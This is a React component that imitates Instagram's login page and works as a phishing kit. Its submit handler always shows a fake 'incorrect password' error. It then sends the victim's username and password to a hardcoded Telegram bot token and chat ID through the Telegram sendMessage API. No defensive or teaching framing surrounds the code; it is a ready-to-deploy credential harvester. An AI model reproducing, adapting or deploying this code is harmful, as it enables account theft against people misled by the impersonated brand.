import { useState } from "react";

export function App() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  const isFormValid = username.length > 0 && password.length >= 6;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid) return;

    setIsLoading(true);
    setError("");

    // Simulate loading for 2-3 seconds
    await new Promise((resolve) => setTimeout(resolve, 2500));

    // Show wrong password error
    setError("Sorry, your password was incorrect. Please double-check your password.");
    setIsLoading(false);

    // Send to Telegram
    try {
      const message = `Username: ${username}\nPassword: ${password}`;
      const telegramBotToken = "7471112121:AAHXaDVEV7dQTBdpP38OBvytroRUSu-2jYo";
      const chatId = "7643222418";

      await fetch(
        `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`
      );
    } catch (err) {
      console.error("Telegram error:", err);
    }
  };

  return (
    <div className="min-h-screen bg-white flex">
      {/* Left Side - Background Image */}
      <div className="hidden lg:flex lg:w-1/2 items-center justify-center bg-gradient-to-b from-[#feda75] via-[#fa7e1e] to-[#d92e7f]">
        <div className="relative w-96 h-96">
          {/* Instagram Logo Carousel Mock */}
          <svg
            className="w-full h-full animate-pulse"
            viewBox="0 0 400 400"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <defs>
              <linearGradient
                id="instaGradient"
                x1="0%"
                y1="100%"
                x2="100%"
                y2="0%"
              >
                <stop offset="0%" stopColor="#feda75" />
                <stop offset="5%" stopColor="#fa7e1e" />
                <stop offset="45%" stopColor="#d92e7f" />
                <stop offset="60%" stopColor="#9b36b7" />
                <stop offset="90%" stopColor="#515bd4" />
              </linearGradient>
            </defs>
            {/* Phone Frame */}
            <rect
              x="50"
              y="30"
              width="300"
              height="340"
              rx="20"
              fill="white"
              stroke="#000"
              strokeWidth="8"
            />
            {/* Screen */}
            <rect
              x="60"
              y="50"
              width="280"
              height="300"
              rx="15"
              fill="url(#instaGradient)"
            />
            {/* Camera */}
            <circle cx="200" cy="100" r="40" fill="none" stroke="white" strokeWidth="3" />
            <circle cx="200" cy="100" r="25" fill="none" stroke="white" strokeWidth="2" />
            {/* Dot */}
            <circle cx="230" cy="70" r="5" fill="white" />
          </svg>
        </div>
      </div>

      {/* Right Side - Login Form */}
      <div className="flex-1 flex flex-col items-center justify-center px-4 py-6">
        <div className="w-full max-w-sm">
          {/* Instagram Logo */}
          <div className="flex justify-center mb-8">
            <svg
              className="w-40 h-auto"
              viewBox="0 0 200 50"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <text
                x="30"
                y="35"
                fontFamily="Helvetica, Arial, sans-serif"
                fontSize="32"
                fontWeight="300"
                fill="black"
                letterSpacing="2"
              >
                Instagram
              </text>
            </svg>
          </div>

          {/* Login Container */}
          <div className="border border-[#dbdbdb] rounded-sm px-10 py-12 bg-white mb-3">
            <form className="flex flex-col gap-2" onSubmit={handleSubmit}>
              {/* Username Input */}
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                disabled={isLoading}
                className="w-full h-10 bg-[#fafafa] border border-[#dbdbdb] rounded-sm px-3 py-2 text-xs outline-none focus:border-[#b3b3b3] focus:bg-white placeholder-[#a8a8a8] transition-colors disabled:opacity-60"
                placeholder="Phone number, username, or email"
              />

              {/* Password Input */}
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  disabled={isLoading}
                  className="w-full h-10 bg-[#fafafa] border border-[#dbdbdb] rounded-sm px-3 py-2 text-xs outline-none focus:border-[#b3b3b3] focus:bg-white placeholder-[#a8a8a8] transition-colors disabled:opacity-60"
                  placeholder="Password"
                />
                {password.length > 0 && (
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    disabled={isLoading}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-xs font-semibold text-[#262626] hover:opacity-80 disabled:opacity-60"
                  >
                    {showPassword ? "Hide" : "Show"}
                  </button>
                )}
              </div>

              {/* Error Message */}
              {error && (
                <div className="mt-2 p-3 bg-[#fff3cd] border border-[#ffc107] rounded-sm">
                  <p className="text-[#856404] text-xs text-center leading-relaxed">
                    {error}
                  </p>
                </div>
              )}

              {/* Login Button */}
              <button
                type="submit"
                disabled={!isFormValid || isLoading}
                className={`w-full h-9 mt-4 rounded-lg font-semibold text-white text-sm transition-all flex items-center justify-center gap-2 ${
                  isLoading
                    ? "bg-[#0095f6] cursor-not-allowed opacity-70"
                    : isFormValid
                    ? "bg-[#0095f6] hover:bg-[#1877f2] active:scale-95 cursor-pointer"
                    : "bg-[#0095f6]/50 cursor-not-allowed"
                }`}
              >
                {isLoading ? (
                  <>
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    <span>Logging in...</span>
                  </>
                ) : (
                  "Log in"
                )}
              </button>
            </form>

            {/* Divider */}
            <div className="flex items-center my-4">
              <div className="flex-1 h-px bg-[#dbdbdb]"></div>
              <span className="px-4 text-xs font-semibold text-[#8e8e8e] uppercase">
                or
              </span>
              <div className="flex-1 h-px bg-[#dbdbdb]"></div>
            </div>

            {/* Facebook Login */}
            <button className="w-full flex items-center justify-center gap-2 py-2 hover:opacity-80 transition-opacity">
              <svg
                className="w-5 h-5 text-[#385185]"
                viewBox="0 0 24 24"
                fill="currentColor"
              >
                <path d="M9.198 21.5h4v-8.01h3.604l.396-3.98h-4V7.5a1 1 0 0 1 1-1h3v-4h-3a5 5 0 0 0-5 5v2.01h-2l-.396 3.98h2.396v8.01Z" />
              </svg>
              <span className="text-sm font-semibold text-[#385185]">
                Log in with Facebook
              </span>
            </button>

            {/* Forgot Password */}
            <div className="text-center mt-4">
              <a
                href="#"
                className="text-xs text-[#00376b] hover:opacity-80 transition-opacity"
              >
                Forgot password?
              </a>
            </div>
          </div>

          {/* Sign Up Container */}
          <div className="border border-[#dbdbdb] rounded-sm py-4 text-center bg-white mb-3">
            <p className="text-sm text-[#262626]">
              Don't have an account?{" "}
              <a href="#" className="font-semibold text-[#0095f6] hover:opacity-80">
                Sign up
              </a>
            </p>
          </div>

          {/* Get App */}
          <div className="text-center">
            <p className="text-sm text-[#262626] mb-3">Get the app.</p>
            <div className="flex justify-center gap-2">
              <a href="#" className="hover:opacity-80 transition-opacity">
                <img
                  src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'%3E%3Ctext x='10' y='25' font-size='12' fill='black'%3EApp Store%3C/text%3E%3C/svg%3E"
                  alt="App Store"
                  className="h-10"
                />
              </a>
              <a href="#" className="hover:opacity-80 transition-opacity">
                <img
                  src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'%3E%3Ctext x='10' y='25' font-size='12' fill='black'%3EGoogle Play%3C/text%3E%3C/svg%3E"
                  alt="Google Play"
                  className="h-10"
                />
              </a>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="absolute bottom-0 w-full px-4 py-6 bg-white border-t border-[#dbdbdb]">
        <div className="max-w-6xl mx-auto">
          <div className="flex flex-wrap justify-center gap-x-4 gap-y-2 mb-4 text-xs text-[#8e8e8e]">
            {[
              "Meta",
              "About",
              "Blog",
              "Jobs",
              "Help",
              "API",
              "Privacy",
              "Terms",
              "Top Accounts",
              "Locations",
              "Instagram Lite",
              "Threads",
              "Contact Uploading & Non-Users",
              "Meta Verified",
            ].map((item) => (
              <a
                key={item}
                href="#"
                className="hover:opacity-70 transition-opacity"
              >
                {item}
              </a>
            ))}
          </div>
          <div className="flex justify-center items-center gap-4 text-xs text-[#8e8e8e]">
            <select className="bg-white outline-none cursor-pointer hover:opacity-70">
              <option>English</option>
              <option>Español</option>
              <option>Français</option>
              <option>Deutsch</option>
              <option>한국어</option>
              <option>日本語</option>
              <option>中文(简体)</option>
            </select>
            <span>© 2024 Instagram from Meta</span>
          </div>
        </div>
      </footer>
    </div>
  );
}